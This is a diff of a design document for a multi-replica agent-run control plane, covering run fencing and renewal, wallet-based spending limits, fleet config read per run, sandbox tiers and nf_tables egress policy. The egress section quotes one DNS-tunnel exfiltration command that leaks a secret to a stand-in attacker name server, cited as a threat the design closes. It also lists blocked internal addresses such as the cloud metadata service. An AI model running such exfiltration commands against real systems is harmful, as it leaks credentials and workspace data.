@@ -18,7 +18,7 @@ Every row is taken from the sections below; the owner column names the section t
 | Invariant | Value | Mechanism | Owner section |
 |---|---|---|---|
 | Run expiry backstop | `RUN_TTL` = 38 s (single-sourced for the control plane in `afd_runner`'s timing constants) | the next eligible assignment re-runs an expired thread with a higher fencing token | §Failure recovery model |
-| Max run duration | none | `/renew` extends to `now+RUN_TTL` at any age; the fleet's budget, the tenant's balance or a person's Stop ends a looping run, and a durable task's own deadline shortens the grant | §Per-run renewal |
+| Max run duration | none | `/renew` extends to `now+RUN_TTL` at any age; the payer's balance or a person's Stop ends a looping run, and a durable task's own deadline shortens the grant | §Per-run renewal |
 | Stale-writer rejection | `UZ-RUN-005` | `report` verifies the monotonic `fencing_token` in the same atomic statement that flips the run | §System guarantees |
 | Sandbox failure fails closed | `startup_posture` | the turn never runs; the run reports `fleet_error` naming why, and nothing runs unsandboxed in its place | §System guarantees |
 | Renewal refused on empty wallet | `UZ-RUN-012` | each `/renew` meters the run's slice and refuses one the wallet cannot cover; reachable for any exhausted tenant | §Money gates |
@@ -34,11 +34,12 @@ Every row is taken from the sections below; the owner column names the section t
 | Multi-replica gauges | counters exact via `sum by`; `active_runs` approximate | the `+1` grant and `−1` release can land on different replicas | §Multi-replica |
 | Sandbox tiers | 3 (`landlock_full` · `container_nested` · `dev_none`) | the daemon reconciles each against the host's report; tier is orthogonal to egress policy | §Sandbox tiers |
 | Egress policies | 3 (`allow_all` · `deny_all_egress` · `allow_list_egress`) | host-side default-deny nf_tables rules on a veth pair; port 53 dropped; IPv4 only | §Egress model |
+| Fleet network toggles | 2 (`http_egress` `restricted` or `public`; `package_domains`), both off at birth | a signed-in person flips them; they feed the run's `NetworkPolicy` under the runner's posture, which stays the ceiling | §Egress model |
 | Cancel latency | the runner's next Cancel message | archive and delete send Cancel to each live run's runner; the heartbeat names no run | §Steer, archive, delete |
-| Config freshness | named by the assignment | the assignment returns the head revision id and a replica holds the parsed definition under that id, so the next run sees the change; no reload signal | §Config |
+| Config freshness | read per run | the policy build reads the fleet row and its approved grants for every run, so the next run sees a change; no reload signal | §Config |
 | Usage point | the run's usage, per renewal | nothing is reserved at issue; each `/renew` and the report log the slice as a usage line, whose insert debits the wallet; a funds check reads the wallet's balance | §Money gates |
 | Production shape | 3 `agentsfleetd` machines | set and verified by the release workflow; runner verbs load-balance across replicas | §Multi-replica |
-| Turns queue | `thread.turns` where `settled_at IS NULL` | oldest unsettled row per fleet; parked heads block later work | §Datastore topology |
+| Turns queue | `thread.turns` where `settled_at IS NULL` | oldest unsettled row per fleet; a turn waiting on a question or an access card settles as waiting, so it holds no later turn | §Datastore topology |
 
 ## Traps
 
@@ -68,7 +69,9 @@ Each trap is enforced in its owner section; this list is the index.
 
 - No secret enters a sandbox. Model keys and minted tokens stay in the supervisor, and bubblewrap starts every sandbox with a cleared environment (§Process-boundary hardening).
 
-- Config is cached only by its head revision id, which every assignment reads, so the next run obeys an edit. Warm mode reuses only the sandbox shell (§Config).
+- Config is read from the fleet row and its approved grants for every run, so the next run obeys an edit. Warm mode reuses only the sandbox shell (§Config).
+
+- A fleet's network toggle never widens the runner's posture. On an `allow_all` runner the sandbox shares the host's network whatever the toggle says (§Egress model).
 
 - No forward proxy, no SNI/`CONNECT` interception, no TLS man-in-the-middle. The deferred name layer is eBPF/FQDN (§Egress model).
 
@@ -121,7 +124,7 @@ Everything below follows from that one decision. Read the guarantees before the 
 | **No turn loss on runner death** | A runner that crashes, partitions, or is killed mid-turn never drops the turn. | The run has a `run_expires_at`; a later assignment re-runs the unsettled turn with a higher fence. Durability is at-least-once through `thread.turns` and the fenced assignment. |
 | **At-most-once durable effect** | A reclaimed or duplicate runner cannot double-write state. | Every run carries a monotonic `fencing_token`; `report` verifies it in the same atomic statement that flips the run to `reported`. A stale holder's report is rejected (`UZ-RUN-005`). |
 | **Secrets never leave the trust boundary** | Tenant credentials are never written to a runner's disk, logs, or cache. | `secrets_map` rides the run inline over Transport Layer Security (TLS), is substituted at send time by the supervisor's egress guard outside every sandbox, and is never saved runner-side ([Runner runtime](./runner_execution.md) §Credentials). |
-| **Tool calls are always sandboxed** | No tenant program ever runs un-isolated. | A run offered a tool that runs in a sandbox gets one under bubblewrap, Landlock, seccomp and its own cgroup; a sandbox that cannot be built fails **closed**: the turn never runs and the run reports `fleet_error` as `startup_posture`. A run whose tools all run in the supervisor starts none. |
+| **Tool calls are always sandboxed** | No tenant program ever runs un-isolated. | A run offered a tool that runs in a sandbox gets one under bubblewrap, Landlock, seccomp and its own cgroup; a sandbox that cannot be built fails **closed**: the turn never runs and the run reports `fleet_error` as `startup_posture`. Every fleet is offered the whole catalog, so every run prepares one. |
 | **The runner holds no datastore credentials** | A compromised or untrusted host cannot reach Postgres, NATS, or the Vault. | No runner crate links `sqlx` or `async-nats` ([`runner_execution.md`](./runner_execution.md) §Crates); the only platform surface the runner reaches is the authenticated `/v1/runners` protocol carrying a `agt_r` token. |
 
 ### Runners are cattle, not pets
@@ -145,7 +148,7 @@ A runner's work becomes eligible when its thread's run expires. The next assign 
 | Report response lost | The same runner retries and receives the stored outcome. | A repeated report adds no usage line or delivery. |
 | Sandbox setup fails | The runner reports `fleet_error` as `startup_posture`. | Work never runs without the assigned sandbox. |
 
-A live runner renews through the fenced `/renew` route. Renewal is gated on credits and the fleet's budget, and a run renews at any age.
+A live runner renews through the fenced `/renew` route. Renewal is gated on the payer's credits, and a run renews at any age.
 A runner that stops renewing loses its thread at the database deadline.
 
 The replacement keeps the turn and reads its committed recovery descriptor.
@@ -175,7 +178,6 @@ Renewal atomically extends **both** the run row and the thread row under a fence
      . still the fencing holder?  no -> 409 run_lost  -> runner cuts the run
      . Stop marked?               yes -> 409 run_cancelled -> stop + report
      . credits cover the run?     no -> 402 no_credits  -> stop
-     . fleet budget left?         no -> 402 budget_exceeded -> stop + report
      . else -> extend run_expires_at AND thread.run_expires_at to
                now+RUN_TTL, at any age; bump last_seen_at
 
@@ -186,7 +188,9 @@ Renewal atomically extends **both** the run row and the thread row under a fence
    beats and lapse detection never reassigns a live long-runner's own run.
 ```
 
-No clock ends a run. A looping run stops when its fleet's budget or its tenant's balance refuses a renewal, or when a person presses Stop. A durable task's run is granted no further than its task's deadline and running allowance; a renewal past them answers `UZ-RUN-011` (`meter_run.sql` in `afd_fleet`).
+No clock ends a run. A looping run stops when the payer's balance refuses a renewal, or when a person presses Stop. No fleet has a budget of its own.
+
+A durable task's run is granted no further than its task's deadline and running allowance. A renewal past them answers `UZ-RUN-011` (`meter_run.sql` in `afd_fleet`).
 
 A transient renewal failure retries on the next tick. At the last granted deadline, the runner stops and another runner can reclaim unsettled work. Fences reject stale durable writes; external effects keep their own retry and idempotency limits.
 
@@ -347,7 +351,9 @@ Each one rides the runner's identity on the enrollment read and on **every heart
 
 **Durable tasks** follows that assignment path through the required `durable_tasks_enabled` boolean.
 New and migrated assignments default to On; whole-policy writes must carry the saved value explicitly.
-An Off value prevents new durable runs, including initial work from durable-task setup, without changing ordinary work eligibility.
+An Off value prevents new durable runs, including a new task's first run, without changing ordinary work eligibility.
+
+A runner that is not task-capable is never offered `task_start` or `task_input` ([durable tasks](durable_tasks.md#how-a-task-starts)).
 
 Supported software still advertises `durable_tasks_v1` while its assignment is Off.
 Existing durable runs retain their frozen mode, input, recovery, accounting and report duties.
@@ -441,7 +447,19 @@ agentsfleet platform runners runs <RUNNER_ID>
 
 Operators read runners through `GET /v1/admin/runners` and change them through `PATCH /v1/admin/runners/{id}`. The read derives liveness and excludes token hashes. Lifecycle changes append actor-attributed runner events.
 
-A runner can hold multiple active runs. Busy status derives from live runs; the server counts fleet and setup occupancy under the runner-row lock before granting capacity. [Setup runs](#setup-runs) describes the shared limit.
+A runner can hold multiple active runs. Busy status derives from live runs; the server counts occupancy under the runner-row lock before granting capacity (§Runner capacity).
+
+### Runner capacity
+
+An assignment locks the runner row, counts live runs plus valid sandbox holds, and inserts within that transaction. Reusing the assigned fleet's hold transfers its worker once. Renewal counts live work without charging idle holds again.
+
+The local keeper retires the oldest holds to keep one worker free. `afd_runner/src/capacity` and `afr_supervisor/src/holds` own the server and host checks.
+
+The server owns `worker_count`, and the connection cannot override it. Reducing it below current occupancy stops new assignments and refuses renewals until occupancy fits (`afd_runner`'s capacity module). Existing runs can therefore be interrupted.
+
+A renewal takes the runner row before extending a live deadline, then the run's thread and row. [Concurrency](concurrency.md) owns that ordering.
+
+Renewals sample database time after acquiring the host guard. Expired work requires a new capacity-checked assignment, and renewal cannot revive it. Runtime renewal extends the run and thread deadlines atomically under their original fences.
 
 > [!WARNING]
 > Cordon and drain currently block every authenticated runner request, including renewal and reports. The capacity layer permits cordoned or draining renewals, but authentication accepts only `active` tokens (`afd_state`'s credential rows and `afd_auth`'s authenticate step). Do not rely on these actions for graceful completion; existing work can stop and reports can remain spooled.
@@ -545,12 +563,11 @@ The heading keeps its old words so links to it stay stable; one event is one tur
 A `run` reply is the runner's entire input for a turn. The runner runs the turn and sends the result back with `report`. [Runner runtime](./runner_execution.md) §"One run, end to end" walks the runner's side.
 
 ```text
-run -> { event, ExecutionPolicy, instructions }  (full shape: API reference > Runner plane)
-   (`instructions` = the `instructions_md` of the fleet's selected setup revision,
-    read by the assignment from the installed revision; the agent loop builds the
-    system prompt from it so the reviewed behaviour runs on every trigger. Soft
-    reasoning input, never a secret: the provider key and secrets_map stay in
-    ExecutionPolicy and the supervisor.)
+run -> { event, ExecutionPolicy, name, unfinished tasks }  (full shape: API reference > Runner plane)
+   (`name` = the fleet's name; the agent loop writes the fixed prompt text with it,
+    then the fleet's pinned `core` memory. Soft reasoning input, never a secret:
+    the provider key and secrets_map stay in ExecutionPolicy and the supervisor.
+    ExecutionPolicy is built from the fleet row and its approved grants.)
    |
 agentsfleet-runner supervisor: admit the policy, take the fleet's turn, load memory;
    when a tool runs in a sandbox, take the fleet's held sandbox or build one and check
@@ -584,9 +601,24 @@ The heading keeps its old words so links to it stay stable.
 One run is one run. [Conversation compaction](context_lifecycle.md) saves working notes and continues within that run, retaining tool access.
 A report's outcome is `processed` or `fleet_error`; context pressure does not request another run (`af_wire`'s report type).
 
-A continuation turn still exists, chained by `resumes_turn_id`. An approval's answer writes one, and the next run runs it (`afd_approval`'s inbox resolve). Durable state across runs is in `agentsfleetd`, never runner-local, which is why any runner can take the next turn.
+A continuation turn still exists, chained by `resumes_turn_id`. The answer to a question or an access card writes one, and the next run resumes the asking turn (`afd_approval`'s inbox resolve). Durable state across runs is in `agentsfleetd`, never runner-local, which is why any runner can take the next turn.
 
 Sticky routing (below) prefers the runner that ran the previous turn, but correctness never depends on it.
+
+### Token and time bounds
+
+The runner makes every model call; the daemon makes none.
+
+| Bound | Value | Enforcement |
+|---|---|---|
+| Input per model call | Selected model's physical window | guffbolt's window hook compacts the oldest turns when the window fills. |
+| Wall time per run | None | The payer's balance at a renewal or a person's Stop ends a run (§Per-run renewal). |
+| Runs per turn | `[turns] max_runs_per_turn`, default `af_core::limits::DEFAULT_MAX_RUNS_PER_TURN` (3) | A lapsed run is reassigned at the next fence and reruns the turn from its checkpoint (§Failure recovery model). |
+| Message text | 1,048,576 characters | The one text ceiling, `af_validate::TEXT_MAX_CHARS`, independently of tokenizer counts. |
+
+[Conversation compaction](context_lifecycle.md) keeps working notes without a fixed message or token allowance for the conversation.
+
+The `o200k_base` estimate for an unrecognized model carries a quarter of headroom, so it can refuse input that the provider's tokenizer would fit. Provider-reported usage remains authoritative for settlement, including charged reasoning tokens.
 
 ## Memory continuity: durable fleet memory rides the trusted plane
 
@@ -809,7 +841,7 @@ The browser's reply decoder uses Hermes protocol parsing and incremental HTML to
 
 The bracket frames are published by `agentsfleetd` itself (`afd_fleet::run::bracket`, shapes in `afd_api_wire::tail::TailFrame`). So the tail has open and close markers even before the runner forwards a single mid-run frame.
 
-The bracket frames are `turn_received`, `turn_complete`, and `gate_opened` / `gate_resolved`. The run verb or an approval's resolve writes `turn_received` with the row; a report or a gate refusal closes it with `turn_complete`.
+The bracket frames are `turn_received`, `turn_complete`, and `gate_opened` / `gate_resolved`. The run verb or a card's resolve writes `turn_received` with the row; a report or a refusal closes it with `turn_complete`.
 
 Each carries what a watcher needs to fold it in without a read. `turn_complete` is the terminal row from the closing statement's `RETURNING`. The gate frames carry `pending_approvals` from the statement that moved the gate.
 
@@ -823,7 +855,7 @@ The opening bracket must read after its insert. That insert fires the counter tr
 
 The read is best-effort like the publish. A read that does not answer sends the frame with the counters absent, which a client reads as "leave what you have standing". It never sends zeros, which a client would read as a fleet that has done nothing.
 
-A publisher whose own write moved the counters (the receive, the continuation, the park, the resolve) reads on the connection that write held. So the hot path pays one statement and no second acquire.
+A publisher whose own write moved the counters (the receive, the continuation, the card, the resolve) reads on the connection that write held. So the hot path pays one statement and no second acquire.
 
 Both counters only grow, so a client keeps the GREATER of what it holds and what a frame carries. That is what makes a frame that crossed a `hello` in flight harmless.
 
@@ -839,21 +871,21 @@ The daemon serves asynchronous response bodies through the shared hub, with a se
 
 ## Steer, archive, delete
 
-`agentsfleetd` decides all three, because it owns both `fleet.fleets.status` and run issuance. A fleet is `installing`, `active` or `archived`; there is no stop, resume or pause.
+`agentsfleetd` decides all three, because it owns both `fleet.fleets.status` and run issuance. A fleet is `active` or `archived`; there is no stop, resume or pause.
 
-Renewal reads the fleet's stored config whatever its status (`afd_fleet`'s run coverage read). A run on an archived fleet therefore still stops at the fleet's stored budget ceiling. An archived fleet's config cannot be edited.
+Renewal checks the payer's balance whatever the fleet's status, so a run on an archived fleet still stops when the balance runs out. An archived fleet cannot be edited.
 
 - **Steer** — a message to a fleet. The send answers one of three dispositions: `started`, `folded` or `queued`. With no run live and nothing waiting, the message starts a run of its own.
 
   While a run is live, the message **folds** into that run. The send answers `folded` with `folded_into_turn_id`. The running run takes it at its next model call through a native `folds` request.
 
-  A run takes a person's messages in its own conversation after its own, oldest first. It stops at the first parked (approval-gated), task-bound or non-person one.
+  A run takes a person's messages in its own conversation after its own, oldest first. It stops at the first task-bound or non-person one.
 
 That message is a barrier, and nothing after it folds. The model call in flight is never cut short.
 
   When the run reports succeeded, each folded message's own turn gets the run's reply. Anything else waits its turn as `queued`. Not an interrupt.
 
-- **Archive** — `PATCH /v1/workspaces/{workspace_id}/fleets/{fleet_id}` with `status: archived` (`agentsfleet fleet archive`) sets `status=archived` and stops issuing runs. It cancels setup grants, marks live runs `cancel_requested_at` and sends each runner a Cancel (`afd_setup`'s creation patch). History stays readable, and archive is terminal.
+- **Archive** — `PATCH /v1/workspaces/{workspace_id}/fleets/{fleet_id}` with `status: archived` (`agentsfleet fleet archive`) sets `status=archived` and stops issuing runs. It marks live runs `cancel_requested_at` and sends each runner a Cancel (`afd_setup`'s creation patch). History stays readable, and archive is terminal.
 
 - **Delete** — `DELETE` on the fleet (`agentsfleet fleet delete`) removes it in any status. It first does what archive does to live work (`afd_setup`'s creation release), then purges the rows. A runner that reads the Cancel after its run row is gone stops at its next renewal, which answers `RUN_NOT_FOUND`.
 
@@ -863,11 +895,11 @@ Archive and delete reach a running run only through the runner Cancel message; t
 
 A run runs in a fresh sandbox or its fleet's held sandbox. A run that fails, is interrupted or is superseded tears its sandbox down.
 
-The runner's per-run sandbox, its measured cold start and where its bytes live are in [`runner_execution.md`](./runner_execution.md) §"A run's sandbox today". A run whose tools all run in the supervisor starts no sandbox at all.
+The runner's per-run sandbox, its measured cold start and where its bytes live are in [`runner_execution.md`](./runner_execution.md) §"A run's sandbox today". Every fleet is offered the whole tool catalog, so every run prepares a sandbox.
 
 A run that ends **processed** leaves its sandbox **held** for the same fleet. The frozen sandbox keeps its workspace files for ten idle minutes ([Workspace between runs](./runner_execution.md#workspace-between-runs)). The fleet's next run can continue in it.
 
-Every run carries the config of the head revision its assignment read, and fresh secrets. A hold whose limits or policy changed is destroyed. Sticky routing remains a hint.
+Every run carries the policy its assignment built from the fleet row and its approved grants, and fresh secrets. A hold whose limits or policy changed is destroyed. Sticky routing remains a hint.
 
 The report's guarded release may accept a hold within that window.
 Its reply names the exact run, fence and deadline; a refused hold releases that local reservation.
@@ -887,17 +919,19 @@ Eligibility requires that holder to be active, not degraded, and seen within `RU
 
 ## Config
 
-A Fleet's config is the `config` member of its selected setup revision in `fleet.revisions`, validated by `af_fleet_runtime::Definition`. It holds the model, tool allowlist, network policy, context budget, gate rules, trigger settings and secret references.
+A fleet's config is its `fleet.fleets` row and its approved grants. The row holds the model (`model_ref`) and the two network toggles, `http_egress` and `package_domains`. The grants hold the secrets and the GitHub scope a person approved.
 
-The assignment reads it from that revision (`afd_fleet`'s installed-revision read). A reviewed improvement (`POST /v1/workspaces/{ws}/fleets/{id}/revisions`, N11 in [`api_resources.md`](./api_resources.md)) appends a new revision and selects it. `PATCH` on the fleet changes only its status and name.
+Every run is offered every published tool, so there is no tool allowlist. Context limits come from the selected model with no per-fleet override, and no fleet has a budget or an event-gate rule.
 
-Every assignment reads the fleet's `head_revision_id` in its own statement. Each replica caches the parsed definition keyed by that id, and revisions are append-only, so an id never names two documents. A config change therefore takes effect on the **next command** (the next run) on every replica, with no signal between them.
+The policy build (`afd_gate/src/policy/build/mod.rs`) reads the fleet row and its approved grants for every run. `PATCH` on the fleet changes its status, name, model and network toggles ([`api_resources.md`](./api_resources.md)).
 
-A cache key is built only from a statement's row, so no lookup by bare fleet id compiles. There is no `fleet_config_changed` consumer to wait on; the deleted worker's watcher-reload path is gone.
+A config change therefore takes effect on the **next command** (the next run) on every replica, with no signal between them. There is no `fleet_config_changed` consumer to wait on; the deleted worker's watcher-reload path is gone.
 
 A config change never alters a language-model turn already in flight. The next run picks it up.
 
 ## Money gates
+
+The payer's wallet is the only spending ceiling: no fleet has a budget. A payer whose wallet is empty, or who has no wallet row, has the turn refused `balance_exhausted`.
 
 The gates run before the run is issued and charge nothing, and nothing is reserved. Each `/renew` and the report log the slice's usage as a line. Logging a line debits the payer's wallet in the same statement, and a funds check reads the wallet's balance (`afd_billing`'s `select_wallet.sql`). An uncovered renewal is refused `UZ-RUN-012` ([billing_and_provider_keys.md](./billing_and_provider_keys.md) §3, One debit point).
 
@@ -908,7 +942,7 @@ The [datastore design](./datastore_scaling.md#the-turns-ledger-is-the-queue) own
 
 An assignment takes the fleet's thread row before its exact oldest unsettled turn. Both fences advance in one transaction.
 
-Locked or parked heads cannot expose later turns. A gate answer clears the park stamp and publishes a best-effort wake.
+A locked head cannot expose later turns. A turn waiting on a question or an access card settles as waiting, so it holds no later turn. The card's answer writes a continuation turn and publishes a best-effort wake.
 
 The candidate query prefers held fleets and a recent wake hint, then the runner's previous fleet, with random ordering for the rest.
 It checks runner labels and live sandbox holds before attempting an assignment.
@@ -968,6 +1002,8 @@ The runner box is **outbound-only**. It runs no inbound listener (the supervisor
 
 The network threat from a sandbox is a tenant program sending the workspace's contents, or anything it computes, somewhere it should not. The other threat is reaching an internal address.
 
+Two layers decide what a run can reach. The runner's assigned policy is the operator's ceiling for the sandbox. The fleet's two network toggles decide what its HTTP tools reach under that ceiling (§HTTP destination settings).
+
 Three network policies, assigned per runner (`af_wire`'s runner types):
 
 - **`allow_all`** — bubblewrap is not given `--unshare-net` (`afr_sandbox`'s bubblewrap module). The sandbox stays in the host's network namespace, and all outbound egress is allowed.
@@ -978,7 +1014,7 @@ Three network policies, assigned per runner (`af_wire`'s runner types):
 
   The rules are owned by root and never live inside the sandbox's namespace, so `nft flush ruleset` inside it changes nothing. Egress is permitted only to the IPv4 set resolved at run bind. Traffic to any other address is dropped at the kernel, a raw address included, but the set matches addresses alone (residuals below).
 
-  A host the fleet names never brings a private or reserved address into the set. The run is refused instead, as the fail-closed rules below say.
+  A host from the fleet's approved secrets never brings a private or reserved address into the set. The run is refused instead, as the fail-closed rules below say.
 
 **One table per sandbox, scoped to its link.** The table is `inet afegress<slot>`, built over netlink from Rust, never through the `nft` or `ip` binaries. It holds the set of allowed addresses and three chains:
 
@@ -992,11 +1028,9 @@ Every base chain accepts by policy and drops only on its own link. One sandbox's
 
 The deleted runner's design differed here. Each worker's table had a forward chain with `policy drop`, which dropped every other worker's and the host's forwarded packets.
 
-**The merged sandbox allowlist.** At run bind, the supervisor starts with the runner's assigned `registry_allowlist` or, when empty, the default registry set. It then appends the fleet's `network.allow`, deduplicating in first-seen order.
+**The merged sandbox allowlist.** At run bind, the supervisor starts with the runner's assigned `registry_allowlist` or, when empty, the default registry set. It then appends the policy's `allow` list, the hosts of the fleet's approved secrets, deduplicating in first-seen order.
 
 The default registries are `registry.npmjs.org`, `pypi.org`, `files.pythonhosted.org`, `static.crates.io`, `crates.io`, `index.crates.io`, `proxy.golang.org` and `sum.golang.org`.
-
-A fleet with `read_only` keeps its hosts out of the kernel set. Kernel rules cannot enforce HTTP methods; those destinations remain available through guarded HTTP tools.
 
 Each entry is read as a URL's host, using `https://` when no scheme is present. A scheme, port or path is dropped; `[::1]:80` names `::1`.
 
@@ -1014,9 +1048,11 @@ That closes the DNS-tunnel exfiltration channel (`dig $secret.attacker-ns.com @r
 
 **Fail-closed and IPv4 only.** Three faults each refuse the run, and the refusal names its reason. The faults are an unresolved name, a name that resolves to IPv6 alone and any netlink failure.
 
-A host from the fleet's `network.allow` that resolves to any address `af_core::net::is_blocked` refuses also refuses the run. Those addresses are loopback, the private ranges and the tailnet's shared range `100.64.0.0/10`. They also include link-local with the cloud metadata service `169.254.169.254`, and everything reserved.
+A host in the fleet's `allow` list that resolves to any address `af_core::net::is_blocked` refuses also refuses the run. Those addresses are loopback, the private ranges and the tailnet's shared range `100.64.0.0/10`. They also include link-local with the cloud metadata service `169.254.169.254`, and everything reserved.
 
-That is the predicate `http_request` and the daemon's endpoint check use. A host refused at the request layer is therefore refused at the kernel too. The run ends with "the fleet allows an egress host at a private or reserved address", which the fleet owner fixes.
+That is the predicate `http_request` and the daemon's endpoint check use. A host refused at the request layer is therefore refused at the kernel too.
+
+The run ends with "the fleet allows an egress host at a private or reserved address". The fleet's runs stay refused until a person revokes that secret's grant.
 
 The log names the host, never the address. Registry hosts are exempt, because the operator may point them at a mirror on its own network.
 
@@ -1052,15 +1088,21 @@ The host needs nf_tables in its kernel, `net.ipv4.ip_forward=1`, which the runne
 
 ### HTTP destination settings
 
-The reviewed Definition and run carry `network.http_egress`, `package_manager_domains` and `allow`. Restricted mode, the default, permits the additional exact domains plus the standard package registries when their preset is enabled.
+Each fleet row carries two network toggles: `http_egress`, either `restricted` or `public`, and `package_domains`, a boolean. The app shows them as "Allow all" and "Packages", and `agentsfleet fleet network set` changes them too.
 
-Public mode permits public HTTPS destinations through HTTP tools. Both modes retain private/reserved address refusal, credential binding, repository/path restrictions and read-only rules.
+Both are off at birth, so a new fleet is private. Only a signed-in person changes them, through one `PATCH` on the fleet. An API key gets `403`, and the fleet stays unchanged.
+
+The policy build turns the row into the run's `NetworkPolicy`. Its `allow` list holds the hosts of the fleet's approved secrets, read from each secret's `host` field ([where a grant comes from](connectors.md#where-a-grant-comes-from)).
+
+Restricted mode, the default, lets HTTP tools reach only the hosts in `allow`, and GitHub when a GitHub grant is approved. The standard package registries join them when "Packages" is on. `web_fetch` is refused on a restricted fleet, and `web_search` runs at the model provider, outside this policy.
+
+Public mode ("Allow all") permits public HTTPS destinations through HTTP tools, so the fleet can post what it has read to any public host. Both modes keep private and reserved address refusal, credential binding, and repository and path restrictions.
+
+A stored secret is sent only to its own `host` field, in either mode (`af_egress`'s policy). `notify` therefore needs its `pushover` secret to carry `host: api.pushover.net`.
 
 Every connection checks all returned addresses, including mixed public/private answers. Redirects repeat the egress policy check before connecting.
 
-`http_egress` and `package_manager_domains` do not enlarge sandbox network access or change the runner's assigned policy.
-Existing `allow` entries can extend sandbox destinations when `read_only` is `false`, within that policy.
-Dedicated UI controls remain future work.
+The toggles never enlarge sandbox network access or change the runner's assigned policy, which stays the operator's ceiling. On an `allow_all` runner the sandbox shares the host's network whatever the toggle says. There is no read-only mode: a fleet may write with any credential a person approved for it.
 
 ### Guarded tool downloads
 
@@ -1143,86 +1185,3 @@ The series are identified by the OpenTelemetry resource attribute carrying the m
 `active_runs` is the one series that cannot be made exact purely in-memory. It is a distributed inc/dec with no routing affinity and no shared counter. Its exact source is the durable run table (`thread.runs`, `run_expires_at` plus the held set); the daemon runs no timed loop that reads it.
 
 The cross-replica queries in the table above are the operator's responsibility to apply. This repository ships no dashboards, and any dashboard that graphs `active_runs` must label the panel best-effort under N>1.
-
-## Setup runs
-
-A setup run answers one message of a creator-private draft. It is a run on the common run path, owned by the draft instead of a fleet.
-
-Setup work shares runner capacity with fleet runs. Verification evidence belongs in the [check ledger](../reviews/workspace-setup/checks.md).
-
-The native connection declares `accepted_kinds`: `fleet` alone, or `fleet` and `setup` (`af_wire::run::AcceptedKinds`). Every run arrives as a `Down::Run`. A setup run's payload names the draft as its `owner` and carries the setup part: the head candidate, its revision, the message's sequence, `save_requested` and the `propose_setup` tool (`af_wire::run::SetupWork`).
-
-An assignment locks the runner row, counts live runs across both kinds plus valid sandbox holds, and inserts within that transaction.
-
-Reusing the assigned fleet's hold transfers its worker once; setup charges every hold.
-
-Renewal counts live work without charging idle holds again.
-
-The local keeper counts fleet and setup work together and retires oldest holds to preserve one free worker.
-`afd_runner/src/capacity` and `afr_supervisor/src/holds` own the server and host checks.
-
-The server owns `worker_count`; the connection cannot override it. Reducing it below current occupancy stops new assignments and refuses renewals until occupancy fits (`afd_runner`'s capacity module). Existing runs can therefore be interrupted.
-
-The shared poll reads an optimistic kind choice. Under the host lock, each successful placement rechecks and advances the assignment revision and last successful kind. Mixed placements alternate preference across daemon replicas; an empty kind tries the other, and a competing placement invalidates the old choice.
-
-Both renewal kinds take the runner row before extending a live deadline, then the run's thread and row. A setup renewal never takes a draft row. [Concurrency](concurrency.md#runner-capacity-and-setup-lock-order) owns the ordering and the assignment's lock-free draft read.
-
-Renewals sample database time after acquiring the host guard. Expired work requires a new capacity-checked assignment; renewal cannot revive it. Runtime renewal extends the run and thread deadlines atomically under their original fences.
-
-Setup is creator-private work. The assignment resolves the workspace owner and rechecks the creator's membership. It chooses the oldest eligible queued message within the draft, and refuses a second live run for the same draft.
-
-Selection across kinds must avoid starvation with a bounded alternating eligible-kind choice; an empty kind never blocks the other. Setup messages remain a Postgres queue in `thread.turns`; NATS carries wake and progress hints, not another authoritative copy.
-
-The `setup` schema defines creator-private `setup.drafts` and replay receipts; a draft's proposals are `fleet.revisions` rows it owns until one is installed. A draft's chat inputs are its `thread.turns` rows, and a setup run is a `thread.runs` row its draft owns.
-
-A setup run's charges are its usage lines in `billing.usage_lines`, with `work_type = 'setup_run'` and the run as their work. They are retained independently of the chat (billing §11). Immutable native setup revisions join their existing domains.
-
-The private progress channel is the draft's thread, `af.thread.{draft_id}.items`.
-The publisher and HTTP reader recheck current access before sending answer previews.
-No private frame joins workspace broadcast; durable turn reads remain authoritative.
-
-Each setup run has a run identity, a fence, an expiry, a pinned model and its key, and a funds bound. Renewal and report check the run and its fence. No runtime credential mint, tenant tools, memory, repository checkout, schedule access, or fleet message capability is issued to this run. It builds no sandbox.
-
-Instructions and native setup are untrusted context, never system authority.
-
-### Model calls
-
-The runner makes every model call, in one guffbolt loop whose only tool is `propose_setup` (`afr_agent`'s setup module). The daemon makes none.
-
-The assignment opens the pinned model's key and carries it in the run payload. A tenant runner is never assigned a setup run on the platform model. [`AUTH.md`](../AUTH.md#fleet-setup-and-credential-boundary) owns that boundary.
-
-The [shared chat explanation](shared_chat_verification.md#backend-ownership) maps these methods and their callers.
-
-### Token and time bounds
-
-| Bound | Value | Enforcement |
-|---|---|---|
-| Input per model call | Selected model's physical window | guffbolt's window hook compacts the oldest turns when the window fills. |
-| Wall time per run | None | A setup run renews as a fleet run does; the payer's balance at a renewal or a person's Stop ends it. The proposal loop has no cap. |
-| Funds bound | One run lifetime of runtime, the run's first slice | `afd_setup`'s `setup_run/model.rs`; the assignment's gate checks it and sets nothing aside, and every renewal checks the balance again. |
-| Runs per message | `[turns] max_runs_per_turn`, default `af_core::limits::DEFAULT_MAX_RUNS_PER_TURN` (3) | A lapsed run is reassigned at the next fence and reruns the message from the start. Past the limit, the message fails. |
-| Instructions | 1,048,576 characters | The one text ceiling, `af_validate::TEXT_MAX_CHARS`, independently of tokenizer counts. |
-| Proposal in a report | 6,553,600 bytes | `af_validate::DEFINITION_MAX_BYTES`, the bound the Definition parser applies. |
-| Answer preview chunk | 163,157 bytes, about 159 KiB | `afd_setup`'s `setup_run/progress.rs`: the 960 KiB draft frame (`afd_bus::DRAFT_FRAME_BYTES`) less a 4 KiB envelope, over six bytes per escaped character. A longer chunk is skipped. |
-
-Original history remains creator-private and is read in bounded pages. [Conversation compaction](context_lifecycle.md) retains working notes without a fixed 64-message or 32,768-token conversation allowance.
-
-The `o200k_base` estimate for an unrecognized model carries a quarter of headroom, so it can refuse input that the provider's tokenizer would fit. Provider-reported usage remains authoritative for settlement, including charged reasoning tokens.
-
-The model has one proposal tool: initialize once when no candidate exists, then small edits against the candidate ID and revision. `af_fleet_runtime::setup` decides each proposal. A refused proposal goes back to the model as the tool result, and the run goes on. The report carries the last proposal the run kept.
-
-The daemon applies `Definition::parse` and the base check again in the report transaction. Only then does it write the next candidate revision. A proposal it refuses writes no candidate, and the message keeps its answer.
-
-The model may ask clarifying questions. It cannot grant access, Save, call arbitrary functions, or choose different credentials. Tool operations pass the same validator as drawer edits.
-
-### Private copies and report recovery
-
-| Copy | Owner | Lifetime and removal |
-|---|---|---|
-| Draft turns and proposals | Creator-private setup domain | Draft deletion removes private rows, the proposals it still owns and its runs. |
-| The draft's compacted context | Setup domain, `thread.compactions` keyed by the draft's thread | Removed with the draft's thread by foreign key. |
